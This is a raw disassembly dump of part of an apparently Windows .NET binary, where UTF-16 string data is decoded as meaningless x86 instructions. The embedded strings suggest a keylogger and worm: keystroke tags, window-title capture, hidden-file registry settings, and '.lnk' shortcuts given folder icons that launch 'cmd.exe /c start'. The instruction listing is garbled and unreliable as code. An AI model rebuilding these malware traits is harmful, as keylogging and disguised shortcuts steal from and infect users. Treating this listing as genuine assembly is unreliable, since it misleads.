  40b5fc:	00 4c 00 20          	add    %cl,0x20(%eax,%eax,1)
  40b600:	00 22                	add    %ah,(%edx)
  40b602:	00 00                	add    %al,(%eax)
  40b604:	0f 22 00             	mov    %eax,%cr0
  40b607:	20 00                	and    %al,(%eax)
  40b609:	2f                   	das
  40b60a:	00 66 00             	add    %ah,0x0(%esi)
  40b60d:	20 00                	and    %al,(%eax)
  40b60f:	2f                   	das
  40b610:	00 71 00             	add    %dh,0x0(%ecx)
  40b613:	00 1b                	add    %bl,(%ebx)
  40b615:	77 00                	ja     0x40b617
  40b617:	73 00                	jae    0x40b619
  40b619:	63 00                	arpl   %eax,(%eax)
  40b61b:	72 00                	jb     0x40b61d
  40b61d:	69 00 70 00 74 00    	imul   $0x740070,(%eax),%eax
  40b623:	2e 00 73 00          	add    %dh,%cs:0x0(%ebx)
  40b627:	68 00 65 00 6c       	push   $0x6c006500
  40b62c:	00 6c 00 00          	add    %ch,0x0(%eax,%eax,1)
  40b630:	77 53                	ja     0x40b685
  40b632:	00 6f 00             	add    %ch,0x0(%edi)
  40b635:	66 00 74 00 77       	data16 add %dh,0x77(%eax,%eax,1)
  40b63a:	00 61 00             	add    %ah,0x0(%ecx)
  40b63d:	72 00                	jb     0x40b63f
  40b63f:	65 00 5c 00 4d       	add    %bl,%gs:0x4d(%eax,%eax,1)
  40b644:	00 69 00             	add    %ch,0x0(%ecx)
  40b647:	63 00                	arpl   %eax,(%eax)
  40b649:	72 00                	jb     0x40b64b
  40b64b:	6f                   	outsl  %ds:(%esi),(%dx)
  40b64c:	00 73 00             	add    %dh,0x0(%ebx)
  40b64f:	6f                   	outsl  %ds:(%esi),(%dx)
  40b650:	00 66 00             	add    %ah,0x0(%esi)
  40b653:	74 00                	je     0x40b655
  40b655:	5c                   	pop    %esp
  40b656:	00 57 00             	add    %dl,0x0(%edi)
  40b659:	69 00 6e 00 64 00    	imul   $0x64006e,(%eax),%eax
  40b65f:	6f                   	outsl  %ds:(%esi),(%dx)
  40b660:	00 77 00             	add    %dh,0x0(%edi)
  40b663:	73 00                	jae    0x40b665
  40b665:	5c                   	pop    %esp
  40b666:	00 43 00             	add    %al,0x0(%ebx)
  40b669:	75 00                	jne    0x40b66b
  40b66b:	72 00                	jb     0x40b66d
  40b66d:	72 00                	jb     0x40b66f
  40b66f:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
  40b673:	74 00                	je     0x40b675
  40b675:	56                   	push   %esi
  40b676:	00 65 00             	add    %ah,0x0(%ebp)
  40b679:	72 00                	jb     0x40b67b
  40b67b:	73 00                	jae    0x40b67d
  40b67d:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  40b683:	5c                   	pop    %esp
  40b684:	00 45 00             	add    %al,0x0(%ebp)
  40b687:	78 00                	js     0x40b689
  40b689:	70 00                	jo     0x40b68b
  40b68b:	6c                   	insb   (%dx),%es:(%edi)
  40b68c:	00 6f 00             	add    %ch,0x0(%edi)
  40b68f:	72 00                	jb     0x40b691
  40b691:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40b695:	5c                   	pop    %esp
  40b696:	00 41 00             	add    %al,0x0(%ecx)
  40b699:	64 00 76 00          	add    %dh,%fs:0x0(%esi)
  40b69d:	61                   	popa
  40b69e:	00 6e 00             	add    %ch,0x0(%esi)
  40b6a1:	63 00                	arpl   %eax,(%eax)
  40b6a3:	65 00 64 00 00       	add    %ah,%gs:0x0(%eax,%eax,1)
  40b6a8:	1f                   	pop    %ds
  40b6a9:	53                   	push   %ebx
  40b6aa:	00 68 00             	add    %ch,0x0(%eax)
  40b6ad:	6f                   	outsl  %ds:(%esi),(%dx)
  40b6ae:	00 77 00             	add    %dh,0x0(%edi)
  40b6b1:	53                   	push   %ebx
  40b6b2:	00 75 00             	add    %dh,0x0(%ebp)
  40b6b5:	70 00                	jo     0x40b6b7
  40b6b7:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40b6bb:	48                   	dec    %eax
  40b6bc:	00 69 00             	add    %ch,0x0(%ecx)
  40b6bf:	64 00 64 00 65       	add    %ah,%fs:0x65(%eax,%eax,1)
  40b6c4:	00 6e 00             	add    %ch,0x0(%esi)
  40b6c7:	00 17                	add    %dl,(%edi)
  40b6c9:	77 00                	ja     0x40b6cb
  40b6cb:	69 00 6e 00 64 00    	imul   $0x64006e,(%eax),%eax
  40b6d1:	6f                   	outsl  %ds:(%esi),(%dx)
  40b6d2:	00 77 00             	add    %dh,0x0(%edi)
  40b6d5:	73 00                	jae    0x40b6d7
  40b6d7:	74 00                	je     0x40b6d9
  40b6d9:	79 00                	jns    0x40b6db
  40b6db:	6c                   	insb   (%dx),%es:(%edi)
  40b6dc:	00 65 00             	add    %ah,0x0(%ebp)
  40b6df:	00 0f                	add    %cl,(%edi)
  40b6e1:	63 00                	arpl   %eax,(%eax)
  40b6e3:	6d                   	insl   (%dx),%es:(%edi)
  40b6e4:	00 64 00 2e          	add    %ah,0x2e(%eax,%eax,1)
  40b6e8:	00 65 00             	add    %ah,0x0(%ebp)
  40b6eb:	78 00                	js     0x40b6ed
  40b6ed:	65 00 00             	add    %al,%gs:(%eax)
  40b6f0:	13 41 00             	adc    0x0(%ecx),%eax
  40b6f3:	72 00                	jb     0x40b6f5
  40b6f5:	67 00 75 00          	add    %dh,0x0(%di)
  40b6f9:	6d                   	insl   (%dx),%es:(%edi)
  40b6fa:	00 65 00             	add    %ah,0x0(%ebp)
  40b6fd:	6e                   	outsb  %ds:(%esi),(%dx)
  40b6fe:	00 74 00 73          	add    %dh,0x73(%eax,%eax,1)
  40b702:	00 00                	add    %al,(%eax)
  40b704:	13 2f                	adc    (%edi),%ebp
  40b706:	00 63 00             	add    %ah,0x0(%ebx)
  40b709:	20 00                	and    %al,(%eax)
  40b70b:	73 00                	jae    0x40b70d
  40b70d:	74 00                	je     0x40b70f
  40b70f:	61                   	popa
  40b710:	00 72 00             	add    %dh,0x0(%edx)
  40b713:	74 00                	je     0x40b715
  40b715:	20 00                	and    %al,(%eax)
  40b717:	00 07                	add    %al,(%edi)
  40b719:	22 00                	and    (%eax),%al
  40b71b:	20 00                	and    %al,(%eax)
  40b71d:	22 00                	and    (%eax),%al
  40b71f:	00 0f                	add    %cl,(%edi)
  40b721:	26 00 73 00          	add    %dh,%es:0x0(%ebx)
  40b725:	74 00                	je     0x40b727
  40b727:	61                   	popa
  40b728:	00 72 00             	add    %dh,0x0(%edx)
  40b72b:	74 00                	je     0x40b72d
  40b72d:	20 00                	and    %al,(%eax)
  40b72f:	00 0f                	add    %cl,(%edi)
  40b731:	20 00                	and    %al,(%eax)
  40b733:	26 00 20             	add    %ah,%es:(%eax)
  40b736:	00 65 00             	add    %ah,0x0(%ebp)
  40b739:	78 00                	js     0x40b73b
  40b73b:	69 00 74 00 00 0f    	imul   $0xf000074,(%eax),%eax
  40b741:	72 00                	jb     0x40b743
  40b743:	65 00 67 00          	add    %ah,%gs:0x0(%edi)
  40b747:	72 00                	jb     0x40b749
  40b749:	65 00 61 00          	add    %ah,%gs:0x0(%ecx)
  40b74d:	64 00 00             	add    %al,%fs:(%eax)
  40b750:	49                   	dec    %ecx
  40b751:	48                   	dec    %eax
  40b752:	00 4b 00             	add    %cl,0x0(%ebx)
  40b755:	45                   	inc    %ebp
  40b756:	00 59 00             	add    %bl,0x0(%ecx)
  40b759:	5f                   	pop    %edi
  40b75a:	00 4c 00 4f          	add    %cl,0x4f(%eax,%eax,1)
  40b75e:	00 43 00             	add    %al,0x0(%ebx)
  40b761:	41                   	inc    %ecx
  40b762:	00 4c 00 5f          	add    %cl,0x5f(%eax,%eax,1)
  40b766:	00 4d 00             	add    %cl,0x0(%ebp)
  40b769:	41                   	inc    %ecx
  40b76a:	00 43 00             	add    %al,0x0(%ebx)
  40b76d:	48                   	dec    %eax
  40b76e:	00 49 00             	add    %cl,0x0(%ecx)
  40b771:	4e                   	dec    %esi
  40b772:	00 45 00             	add    %al,0x0(%ebp)
  40b775:	5c                   	pop    %esp
  40b776:	00 73 00             	add    %dh,0x0(%ebx)
  40b779:	6f                   	outsl  %ds:(%esi),(%dx)
  40b77a:	00 66 00             	add    %ah,0x0(%esi)
  40b77d:	74 00                	je     0x40b77f
  40b77f:	77 00                	ja     0x40b781
  40b781:	61                   	popa
  40b782:	00 72 00             	add    %dh,0x0(%edx)
  40b785:	65 00 5c 00 63       	add    %bl,%gs:0x63(%eax,%eax,1)
  40b78a:	00 6c 00 61          	add    %ch,0x61(%eax,%eax,1)
  40b78e:	00 73 00             	add    %dh,0x0(%ebx)
  40b791:	73 00                	jae    0x40b793
  40b793:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  40b797:	5c                   	pop    %esp
  40b798:	00 00                	add    %al,(%eax)
  40b79a:	4b                   	dec    %ebx
  40b79b:	48                   	dec    %eax
  40b79c:	00 4b 00             	add    %cl,0x0(%ebx)
  40b79f:	45                   	inc    %ebp
  40b7a0:	00 59 00             	add    %bl,0x0(%ecx)
  40b7a3:	5f                   	pop    %edi
  40b7a4:	00 4c 00 4f          	add    %cl,0x4f(%eax,%eax,1)
  40b7a8:	00 43 00             	add    %al,0x0(%ebx)
  40b7ab:	41                   	inc    %ecx
  40b7ac:	00 4c 00 5f          	add    %cl,0x5f(%eax,%eax,1)
  40b7b0:	00 4d 00             	add    %cl,0x0(%ebp)
  40b7b3:	41                   	inc    %ecx
  40b7b4:	00 43 00             	add    %al,0x0(%ebx)
  40b7b7:	48                   	dec    %eax
  40b7b8:	00 49 00             	add    %cl,0x0(%ecx)
  40b7bb:	4e                   	dec    %esi
  40b7bc:	00 45 00             	add    %al,0x0(%ebp)
  40b7bf:	5c                   	pop    %esp
  40b7c0:	00 73 00             	add    %dh,0x0(%ebx)
  40b7c3:	6f                   	outsl  %ds:(%esi),(%dx)
  40b7c4:	00 66 00             	add    %ah,0x0(%esi)
  40b7c7:	74 00                	je     0x40b7c9
  40b7c9:	77 00                	ja     0x40b7cb
  40b7cb:	61                   	popa
  40b7cc:	00 72 00             	add    %dh,0x0(%edx)
  40b7cf:	65 00 5c 00 63       	add    %bl,%gs:0x63(%eax,%eax,1)
  40b7d4:	00 6c 00 61          	add    %ch,0x61(%eax,%eax,1)
  40b7d8:	00 73 00             	add    %dh,0x0(%ebx)
  40b7db:	73 00                	jae    0x40b7dd
  40b7dd:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  40b7e1:	5c                   	pop    %esp
  40b7e2:	00 2e                	add    %ch,(%esi)
  40b7e4:	00 00                	add    %al,(%eax)
  40b7e6:	03 2e                	add    (%esi),%ebp
  40b7e8:	00 00                	add    %al,(%eax)
  40b7ea:	1b 5c 00 64          	sbb    0x64(%eax,%eax,1),%ebx
  40b7ee:	00 65 00             	add    %ah,0x0(%ebp)
  40b7f1:	66 00 61 00          	data16 add %ah,0x0(%ecx)
  40b7f5:	75 00                	jne    0x40b7f7
  40b7f7:	6c                   	insb   (%dx),%es:(%edi)
  40b7f8:	00 74 00 69          	add    %dh,0x69(%eax,%eax,1)
  40b7fc:	00 63 00             	add    %ah,0x0(%ebx)
  40b7ff:	6f                   	outsl  %ds:(%esi),(%dx)
  40b800:	00 6e 00             	add    %ch,0x0(%esi)
  40b803:	5c                   	pop    %esp
  40b804:	00 00                	add    %al,(%eax)
  40b806:	19 49 00             	sbb    %ecx,0x0(%ecx)
  40b809:	63 00                	arpl   %eax,(%eax)
  40b80b:	6f                   	outsl  %ds:(%esi),(%dx)
  40b80c:	00 6e 00             	add    %ch,0x0(%esi)
  40b80f:	4c                   	dec    %esp
  40b810:	00 6f 00             	add    %ch,0x0(%edi)
  40b813:	63 00                	arpl   %eax,(%eax)
  40b815:	61                   	popa
  40b816:	00 74 00 69          	add    %dh,0x69(%eax,%eax,1)
  40b81a:	00 6f 00             	add    %ch,0x0(%edi)
  40b81d:	6e                   	outsb  %ds:(%esi),(%dx)
  40b81e:	00 00                	add    %al,(%eax)
  40b820:	19 69 00             	sbb    %ebp,0x0(%ecx)
  40b823:	63 00                	arpl   %eax,(%eax)
  40b825:	6f                   	outsl  %ds:(%esi),(%dx)
  40b826:	00 6e 00             	add    %ch,0x0(%esi)
  40b829:	6c                   	insb   (%dx),%es:(%edi)
  40b82a:	00 6f 00             	add    %ch,0x0(%edi)
  40b82d:	63 00                	arpl   %eax,(%eax)
  40b82f:	61                   	popa
  40b830:	00 74 00 69          	add    %dh,0x69(%eax,%eax,1)
  40b834:	00 6f 00             	add    %ch,0x0(%edi)
  40b837:	6e                   	outsb  %ds:(%esi),(%dx)
  40b838:	00 00                	add    %al,(%eax)
  40b83a:	0b 20                	or     (%eax),%esp
  40b83c:	00 2e                	add    %ch,(%esi)
  40b83e:	00 6c 00 6e          	add    %ch,0x6e(%eax,%eax,1)
  40b842:	00 6b 00             	add    %ch,0x0(%ebx)
  40b845:	00 13                	add    %dl,(%ebx)
  40b847:	61                   	popa
  40b848:	00 72 00             	add    %dh,0x0(%edx)
  40b84b:	67 00 75 00          	add    %dh,0x0(%di)
  40b84f:	6d                   	insl   (%dx),%es:(%edi)
  40b850:	00 65 00             	add    %ah,0x0(%ebp)
  40b853:	6e                   	outsb  %ds:(%esi),(%dx)
  40b854:	00 74 00 73          	add    %dh,0x73(%eax,%eax,1)
  40b858:	00 00                	add    %al,(%eax)
  40b85a:	21 26                	and    %esp,(%esi)
  40b85c:	00 73 00             	add    %dh,0x0(%ebx)
  40b85f:	74 00                	je     0x40b861
  40b861:	61                   	popa
  40b862:	00 72 00             	add    %dh,0x0(%edx)
  40b865:	74 00                	je     0x40b867
  40b867:	20 00                	and    %al,(%eax)
  40b869:	65 00 78 00          	add    %bh,%gs:0x0(%eax)
  40b86d:	70 00                	jo     0x40b86f
  40b86f:	6c                   	insb   (%dx),%es:(%edi)
  40b870:	00 6f 00             	add    %ch,0x0(%edi)
  40b873:	72 00                	jb     0x40b875
  40b875:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40b879:	20 00                	and    %al,(%eax)
  40b87b:	00 0b                	add    %cl,(%ebx)
  40b87d:	26 00 65 00          	add    %ah,%es:0x0(%ebp)
  40b881:	78 00                	js     0x40b883
  40b883:	69 00 74 00 00 6f    	imul   $0x6f000074,(%eax),%eax
  40b889:	48                   	dec    %eax
  40b88a:	00 4b 00             	add    %cl,0x0(%ebx)
  40b88d:	45                   	inc    %ebp
  40b88e:	00 59 00             	add    %bl,0x0(%ecx)
  40b891:	5f                   	pop    %edi
  40b892:	00 4c 00 4f          	add    %cl,0x4f(%eax,%eax,1)
  40b896:	00 43 00             	add    %al,0x0(%ebx)
  40b899:	41                   	inc    %ecx
  40b89a:	00 4c 00 5f          	add    %cl,0x5f(%eax,%eax,1)
  40b89e:	00 4d 00             	add    %cl,0x0(%ebp)
  40b8a1:	41                   	inc    %ecx
  40b8a2:	00 43 00             	add    %al,0x0(%ebx)
  40b8a5:	48                   	dec    %eax
  40b8a6:	00 49 00             	add    %cl,0x0(%ecx)
  40b8a9:	4e                   	dec    %esi
  40b8aa:	00 45 00             	add    %al,0x0(%ebp)
  40b8ad:	5c                   	pop    %esp
  40b8ae:	00 73 00             	add    %dh,0x0(%ebx)
  40b8b1:	6f                   	outsl  %ds:(%esi),(%dx)
  40b8b2:	00 66 00             	add    %ah,0x0(%esi)
  40b8b5:	74 00                	je     0x40b8b7
  40b8b7:	77 00                	ja     0x40b8b9
  40b8b9:	61                   	popa
  40b8ba:	00 72 00             	add    %dh,0x0(%edx)
  40b8bd:	65 00 5c 00 63       	add    %bl,%gs:0x63(%eax,%eax,1)
  40b8c2:	00 6c 00 61          	add    %ch,0x61(%eax,%eax,1)
  40b8c6:	00 73 00             	add    %dh,0x0(%ebx)
  40b8c9:	73 00                	jae    0x40b8cb
  40b8cb:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  40b8cf:	5c                   	pop    %esp
  40b8d0:	00 66 00             	add    %ah,0x0(%esi)
  40b8d3:	6f                   	outsl  %ds:(%esi),(%dx)
  40b8d4:	00 6c 00 64          	add    %ch,0x64(%eax,%eax,1)
  40b8d8:	00 65 00             	add    %ah,0x0(%ebp)
  40b8db:	72 00                	jb     0x40b8dd
  40b8dd:	5c                   	pop    %esp
  40b8de:	00 64 00 65          	add    %ah,0x65(%eax,%eax,1)
  40b8e2:	00 66 00             	add    %ah,0x0(%esi)
  40b8e5:	61                   	popa
  40b8e6:	00 75 00             	add    %dh,0x0(%ebp)
  40b8e9:	6c                   	insb   (%dx),%es:(%edi)
  40b8ea:	00 74 00 69          	add    %dh,0x69(%eax,%eax,1)
  40b8ee:	00 63 00             	add    %ah,0x0(%ebx)
  40b8f1:	6f                   	outsl  %ds:(%esi),(%dx)
  40b8f2:	00 6e 00             	add    %ch,0x0(%esi)
  40b8f5:	5c                   	pop    %esp
  40b8f6:	00 00                	add    %al,(%eax)
  40b8f8:	0f 54 00             	andps  (%eax),%xmm0
  40b8fb:	6f                   	outsl  %ds:(%esi),(%dx)
  40b8fc:	00 55 00             	add    %dl,0x0(%ebp)
  40b8ff:	70 00                	jo     0x40b901
  40b901:	70 00                	jo     0x40b903
  40b903:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40b907:	00 03                	add    %al,(%ebx)
  40b909:	5b                   	pop    %ebx
  40b90a:	00 00                	add    %al,(%eax)
  40b90c:	0b 53 00             	or     0x0(%ebx),%edx
  40b90f:	70 00                	jo     0x40b911
  40b911:	61                   	popa
  40b912:	00 63 00             	add    %ah,0x0(%ebx)
  40b915:	65 00 00             	add    %al,%gs:(%eax)
  40b918:	0f 5b 00             	cvtdq2ps (%eax),%xmm0
  40b91b:	53                   	push   %ebx
  40b91c:	00 50 00             	add    %dl,0x0(%eax)
  40b91f:	41                   	inc    %ecx
  40b920:	00 43 00             	add    %al,0x0(%ebx)
  40b923:	45                   	inc    %ebp
  40b924:	00 5d 00             	add    %bl,0x0(%ebp)
  40b927:	00 0d 52 00 65 00    	add    %cl,0x650052
  40b92d:	74 00                	je     0x40b92f
  40b92f:	75 00                	jne    0x40b931
  40b931:	72 00                	jb     0x40b933
  40b933:	6e                   	outsb  %ds:(%esi),(%dx)
  40b934:	00 00                	add    %al,(%eax)
  40b936:	0f 5b 00             	cvtdq2ps (%eax),%xmm0
  40b939:	45                   	inc    %ebp
  40b93a:	00 4e 00             	add    %cl,0x0(%esi)
  40b93d:	54                   	push   %esp
  40b93e:	00 45 00             	add    %al,0x0(%ebp)
  40b941:	52                   	push   %edx
  40b942:	00 5d 00             	add    %bl,0x0(%ebp)
  40b945:	00 0d 45 00 73 00    	add    %cl,0x730045
  40b94b:	63 00                	arpl   %eax,(%eax)
  40b94d:	61                   	popa
  40b94e:	00 70 00             	add    %dh,0x0(%eax)
  40b951:	65 00 00             	add    %al,%gs:(%eax)
  40b954:	0b 5b 00             	or     0x0(%ebx),%ebx
  40b957:	45                   	inc    %ebp
  40b958:	00 53 00             	add    %dl,0x0(%ebx)
  40b95b:	43                   	inc    %ebx
  40b95c:	00 5d 00             	add    %bl,0x0(%ebp)
  40b95f:	00 17                	add    %dl,(%edi)
  40b961:	4c                   	dec    %esp
  40b962:	00 43 00             	add    %al,0x0(%ebx)
  40b965:	6f                   	outsl  %ds:(%esi),(%dx)
  40b966:	00 6e 00             	add    %ch,0x0(%esi)
  40b969:	74 00                	je     0x40b96b
  40b96b:	72 00                	jb     0x40b96d
  40b96d:	6f                   	outsl  %ds:(%esi),(%dx)
  40b96e:	00 6c 00 4b          	add    %ch,0x4b(%eax,%eax,1)
  40b972:	00 65 00             	add    %ah,0x0(%ebp)
  40b975:	79 00                	jns    0x40b977
  40b977:	00 0d 5b 00 43 00    	add    %cl,0x43005b
  40b97d:	54                   	push   %esp
  40b97e:	00 52 00             	add    %dl,0x0(%edx)
  40b981:	4c                   	dec    %esp
  40b982:	00 5d 00             	add    %bl,0x0(%ebp)
  40b985:	00 17                	add    %dl,(%edi)
  40b987:	52                   	push   %edx
  40b988:	00 43 00             	add    %al,0x0(%ebx)
  40b98b:	6f                   	outsl  %ds:(%esi),(%dx)
  40b98c:	00 6e 00             	add    %ch,0x0(%esi)
  40b98f:	74 00                	je     0x40b991
  40b991:	72 00                	jb     0x40b993
  40b993:	6f                   	outsl  %ds:(%esi),(%dx)
  40b994:	00 6c 00 4b          	add    %ch,0x4b(%eax,%eax,1)
  40b998:	00 65 00             	add    %ah,0x0(%ebp)
  40b99b:	79 00                	jns    0x40b99d
  40b99d:	00 13                	add    %dl,(%ebx)
  40b99f:	52                   	push   %edx
  40b9a0:	00 53 00             	add    %dl,0x0(%ebx)
  40b9a3:	68 00 69 00 66       	push   $0x66006900
  40b9a8:	00 74 00 4b          	add    %dh,0x4b(%eax,%eax,1)
  40b9ac:	00 65 00             	add    %ah,0x0(%ebp)
  40b9af:	79 00                	jns    0x40b9b1
  40b9b1:	00 0f                	add    %cl,(%edi)
  40b9b3:	5b                   	pop    %ebx
  40b9b4:	00 53 00             	add    %dl,0x0(%ebx)
  40b9b7:	68 00 69 00 66       	push   $0x66006900
  40b9bc:	00 74 00 5d          	add    %dh,0x5d(%eax,%eax,1)
  40b9c0:	00 00                	add    %al,(%eax)
  40b9c2:	13 4c 00 53          	adc    0x53(%eax,%eax,1),%ecx
  40b9c6:	00 68 00             	add    %ch,0x0(%eax)
  40b9c9:	69 00 66 00 74 00    	imul   $0x740066,(%eax),%eax
  40b9cf:	4b                   	dec    %ebx
  40b9d0:	00 65 00             	add    %ah,0x0(%ebp)
  40b9d3:	79 00                	jns    0x40b9d5
  40b9d5:	00 09                	add    %cl,(%ecx)
  40b9d7:	42                   	inc    %edx
  40b9d8:	00 61 00             	add    %ah,0x0(%ecx)
  40b9db:	63 00                	arpl   %eax,(%eax)
  40b9dd:	6b 00 00             	imul   $0x0,(%eax),%eax
  40b9e0:	0d 5b 00 42 00       	or     $0x42005b,%eax
  40b9e5:	61                   	popa
  40b9e6:	00 63 00             	add    %ah,0x0(%ebx)
  40b9e9:	6b 00 5d             	imul   $0x5d,(%eax),%eax
  40b9ec:	00 00                	add    %al,(%eax)
  40b9ee:	09 4c 00 57          	or     %ecx,0x57(%eax,%eax,1)
  40b9f2:	00 69 00             	add    %ch,0x0(%ecx)
  40b9f5:	6e                   	outsb  %ds:(%esi),(%dx)
  40b9f6:	00 00                	add    %al,(%eax)
  40b9f8:	0b 5b 00             	or     0x0(%ebx),%ebx
  40b9fb:	57                   	push   %edi
  40b9fc:	00 49 00             	add    %cl,0x0(%ecx)
  40b9ff:	4e                   	dec    %esi
  40ba00:	00 5d 00             	add    %bl,0x0(%ebp)
  40ba03:	00 07                	add    %al,(%edi)
  40ba05:	54                   	push   %esp
  40ba06:	00 61 00             	add    %ah,0x0(%ecx)
  40ba09:	62 00                	bound  %eax,(%eax)
  40ba0b:	00 0b                	add    %cl,(%ebx)
  40ba0d:	5b                   	pop    %ebx
  40ba0e:	00 54 00 61          	add    %dl,0x61(%eax,%eax,1)
  40ba12:	00 62 00             	add    %ah,0x0(%edx)
  40ba15:	5d                   	pop    %ebp
  40ba16:	00 00                	add    %al,(%eax)
  40ba18:	0f 43 00             	cmovae (%eax),%eax
  40ba1b:	61                   	popa
  40ba1c:	00 70 00             	add    %dh,0x0(%eax)
  40ba1f:	69 00 74 00 61 00    	imul   $0x610074,(%eax),%eax
  40ba25:	6c                   	insb   (%dx),%es:(%edi)
  40ba26:	00 00                	add    %al,(%eax)
  40ba28:	1f                   	pop    %ds
  40ba29:	5b                   	pop    %ebx
  40ba2a:	00 43 00             	add    %al,0x0(%ebx)
  40ba2d:	41                   	inc    %ecx
  40ba2e:	00 50 00             	add    %dl,0x0(%eax)
  40ba31:	53                   	push   %ebx
  40ba32:	00 4c 00 4f          	add    %cl,0x4f(%eax,%eax,1)
  40ba36:	00 43 00             	add    %al,0x0(%ebx)
  40ba39:	4b                   	dec    %ebx
  40ba3a:	00 3a                	add    %bh,(%edx)
  40ba3c:	00 20                	add    %ah,(%eax)
  40ba3e:	00 4f 00             	add    %cl,0x0(%edi)
  40ba41:	46                   	inc    %esi
  40ba42:	00 46 00             	add    %al,0x0(%esi)
  40ba45:	5d                   	pop    %ebp
  40ba46:	00 00                	add    %al,(%eax)
  40ba48:	1d 5b 00 43 00       	sbb    $0x43005b,%eax
  40ba4d:	41                   	inc    %ecx
  40ba4e:	00 50 00             	add    %dl,0x0(%eax)
  40ba51:	53                   	push   %ebx
  40ba52:	00 4c 00 4f          	add    %cl,0x4f(%eax,%eax,1)
  40ba56:	00 43 00             	add    %al,0x0(%ebx)
  40ba59:	4b                   	dec    %ebx
  40ba5a:	00 3a                	add    %bh,(%edx)
  40ba5c:	00 20                	add    %ah,(%eax)
  40ba5e:	00 4f 00             	add    %cl,0x0(%edi)
  40ba61:	4e                   	dec    %esi
  40ba62:	00 5d 00             	add    %bl,0x0(%ebp)
  40ba65:	00 0b                	add    %cl,(%ebx)
  40ba67:	23 00                	and    (%eax),%eax
  40ba69:	23 00                	and    (%eax),%eax
  40ba6b:	23 00                	and    (%eax),%eax
  40ba6d:	20 00                	and    %al,(%eax)
  40ba6f:	20 00                	and    %al,(%eax)
  40ba71:	00 09                	add    %cl,(%ecx)
  40ba73:	20 00                	and    %al,(%eax)
  40ba75:	23 00                	and    (%eax),%eax
  40ba77:	23 00                	and    (%eax),%eax
  40ba79:	23 00                	and    (%eax),%eax
  40ba7b:	00 1f                	add    %bl,(%edi)
  40ba7d:	4d                   	dec    %ebp
  40ba7e:	00 61 00             	add    %ah,0x0(%ecx)
  40ba81:	69 00 6e 00 57 00    	imul   $0x57006e,(%eax),%eax
  40ba87:	69 00 6e 00 64 00    	imul   $0x64006e,(%eax),%eax
  40ba8d:	6f                   	outsl  %ds:(%esi),(%dx)
  40ba8e:	00 77 00             	add    %dh,0x0(%edi)
  40ba91:	54                   	push   %esp
  40ba92:	00 69 00             	add    %ch,0x0(%ecx)
  40ba95:	74 00                	je     0x40ba97
  40ba97:	6c                   	insb   (%dx),%es:(%edi)
  40ba98:	00 65 00             	add    %ah,0x0(%ebp)
  40ba9b:	00 17                	add    %dl,(%edi)
  40ba9d:	50                   	push   %eax
  40ba9e:	00 72 00             	add    %dh,0x0(%edx)
  40baa1:	6f                   	outsl  %ds:(%esi),(%dx)
  40baa2:	00 63 00             	add    %ah,0x0(%ebx)
  40baa5:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  40baa9:	73 00                	jae    0x40baab
  40baab:	4e                   	dec    %esi
  40baac:	00 61 00             	add    %ah,0x0(%ecx)
  40baaf:	6d                   	insl   (%dx),%es:(%edi)
  40bab0:	00 65 00             	add    %ah,0x0(%ebp)
  40bab3:	00 07                	add    %al,(%edi)
  40bab5:	3f                   	aas
  40bab6:	00 3f                	add    %bh,(%edi)
  40bab8:	00 3f                	add    %bh,(%edi)
  40baba:	00 00                	add    %al,(%eax)
  40babc:	13 53 00             	adc    0x0(%ebx),%edx
  40babf:	6f                   	outsl  %ds:(%esi),(%dx)
  40bac0:	00 66 00             	add    %ah,0x0(%esi)
  40bac3:	74 00                	je     0x40bac5
  40bac5:	77 00                	ja     0x40bac7
  40bac7:	61                   	popa
  40bac8:	00 72 00             	add    %dh,0x0(%edx)
  40bacb:	65 00 5c 00 00       	add    %bl,%gs:0x0(%eax,%eax,1)
  40bad0:	80 9b 4d 00 6f 00 7a 	sbbb   $0x7a,0x6f004d(%ebx)
  40bad7:	00 69 00             	add    %ch,0x0(%ecx)
  40bada:	6c                   	insb   (%dx),%es:(%edi)
  40badb:	00 6c 00 61          	add    %ch,0x61(%eax,%eax,1)
  40badf:	00 2f                	add    %ch,(%edi)
  40bae1:	00 35 00 2e 00 30    	add    %dh,0x30002e00
  40bae7:	00 20                	add    %ah,(%eax)
  40bae9:	00 28                	add    %ch,(%eax)
  40baeb:	00 57 00             	add    %dl,0x0(%edi)
  40baee:	69 00 6e 00 64 00    	imul   $0x64006e,(%eax),%eax
  40baf4:	6f                   	outsl  %ds:(%esi),(%dx)
  40baf5:	00 77 00             	add    %dh,0x0(%edi)
  40baf8:	73 00                	jae    0x40bafa
  40bafa:	20 00                	and    %al,(%eax)
  40bafc:	4e                   	dec    %esi
  40bafd:	00 54 00 20          	add    %dl,0x20(%eax,%eax,1)
  40bb01:	00 36                	add    %dh,(%esi)
  40bb03:	00 2e                	add    %ch,(%esi)
  40bb05:	00 31                	add    %dh,(%ecx)
  40bb07:	00 3b                	add    %bh,(%ebx)
  40bb09:	00 20                	add    %ah,(%eax)
  40bb0b:	00 57 00             	add    %dl,0x0(%edi)
  40bb0e:	69 00 6e 00 36 00    	imul   $0x36006e,(%eax),%eax
  40bb14:	34 00                	xor    $0x0,%al
  40bb16:	3b 00                	cmp    (%eax),%eax
  40bb18:	20 00                	and    %al,(%eax)
  40bb1a:	78 00                	js     0x40bb1c
  40bb1c:	36 00 34 00          	add    %dh,%ss:(%eax,%eax,1)
  40bb20:	3b 00                	cmp    (%eax),%eax
  40bb22:	20 00                	and    %al,(%eax)
  40bb24:	72 00                	jb     0x40bb26
  40bb26:	76 00                	jbe    0x40bb28
  40bb28:	3a 00                	cmp    (%eax),%al
  40bb2a:	36 00 36             	add    %dh,%ss:(%esi)
  40bb2d:	00 2e                	add    %ch,(%esi)
  40bb2f:	00 30                	add    %dh,(%eax)
  40bb31:	00 29                	add    %ch,(%ecx)
  40bb33:	00 20                	add    %ah,(%eax)
  40bb35:	00 47 00             	add    %al,0x0(%edi)
  40bb38:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  40bb3c:	6b 00 6f             	imul   $0x6f,(%eax),%eax
  40bb3f:	00 2f                	add    %ch,(%edi)
  40bb41:	00 32                	add    %dh,(%edx)
  40bb43:	00 30                	add    %dh,(%eax)
